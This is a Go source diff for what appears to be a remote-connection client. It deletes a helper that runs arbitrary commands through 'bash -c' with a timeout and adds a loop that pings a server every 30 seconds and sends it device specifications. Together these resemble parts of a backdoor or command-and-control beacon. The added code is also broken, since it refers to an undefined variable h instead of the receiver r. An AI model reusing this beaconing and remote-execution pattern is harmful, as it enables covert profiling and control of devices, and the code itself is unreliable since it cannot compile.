@@ -2,15 +2,9 @@ package connect
 
 import (
 	"bufio"
-	"context"
 	"encoding/base64"
-	"fmt"
 	"log"
 	"net"
-	"os/exec"
-	"regexp"
-	"strconv"
-	"strings"
 	"time"
 )
 
@@ -23,11 +17,12 @@ import (
 // )
 
 type runner struct {
-	timeout time.Duration
-	gerrors chan error
-	charset string
-	ipPort  string
-	conChan chan net.Conn
+	timeout   time.Duration
+	gerrors   chan error
+	charset   string
+	ipPort    string
+	conChan   chan net.Conn
+	Connected bool
 }
 
 func new(ip string, port string) (*runner, error) {
@@ -95,88 +90,30 @@ func (r *runner) buildConect() {
 
 }
 
-//带有错误、超时的命令执行
-func RunCommandWithErr(command string, timeoutRaw ...string) (string, error) {
-	if len(timeoutRaw) == 0 {
-		return runCommandWithError(command)
-	}
-	var output string
-	var err error
+func (r *runner) KeepConnection() {
+	sleepTime := 30 * time.Second
 
-	timeout := CalcTimeout(timeoutRaw[0])
-	log.Println("Run command with %v seconds timeout", timeout)
-	var out string
-
-	c := context.Background()
-	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
-	c, cancel := context.WithDeadline(c, deadline)
-	defer cancel()
-	go func() {
-		out, err = runCommandWithError(command)
-		cancel()
-	}()
-
-	select {
-	case <-c.Done():
-		return output, err
-	case <-time.After(time.Duration(timeout) * time.Second):
-		return out, fmt.Errorf("command got timeout")
-	}
-}
-
-func runCommandWithError(cmd string) (string, error) {
-	log.Println("Execute: %s", cmd)
-	command := []string{
-		"bash",
-		"-c",
-		cmd,
-	}
-	var output string
-	realCmd := exec.Command(command[0], command[1:]...)
-
-	// output command output to std too
-	cmdReader, _ := realCmd.StdoutPipe()
-	scanner := bufio.NewScanner(cmdReader)
-	go func() {
-		for scanner.Scan() {
-			out := scanner.Text()
-			output += out + "\n"
+	for {
+		if r.Connected {
+			time.Sleep(sleepTime)
 		}
-	}()
-	if err := realCmd.Start(); err != nil {
-		return output, err
-	}
-	if err := realCmd.Wait(); err != nil {
-		return output, err
-	}
-	return output, nil
-}
 
-func CalcTimeout(raw string) int {
-	raw = strings.ToLower(strings.TrimSpace(raw))
-	seconds := raw
-	multiply := 1
-
-	matched, _ := regexp.MatchString(`.*[a-z]`, raw)
-	if matched {
-		unitTime := fmt.Sprintf("%c", raw[len(raw)-1])
-		seconds = raw[:len(raw)-1]
-		switch unitTime {
-		case "s":
-			multiply = 1
-			break
-		case "m":
-			multiply = 60
-			break
-		case "h":
-			multiply = 3600
-			break
+		err := h.ServerIsAvailable()
+		if err != nil {
+			h.Log("[!] Error connecting with server: " + err.Error())
+			h.Connected = false
+			time.Sleep(sleepTime)
+			continue
 		}
-	}
 
-	timeout, err := strconv.Atoi(seconds)
-	if err != nil {
-		return 0
+		err = h.SendDeviceSpecs()
+		if err != nil {
+			h.Log("[!] Error connecting with server: " + err.Error())
+			h.Connected = false
+			time.Sleep(sleepTime)
+			continue
+		}
+
+		h.Connected = true
 	}
-	return timeout * multiply
 }
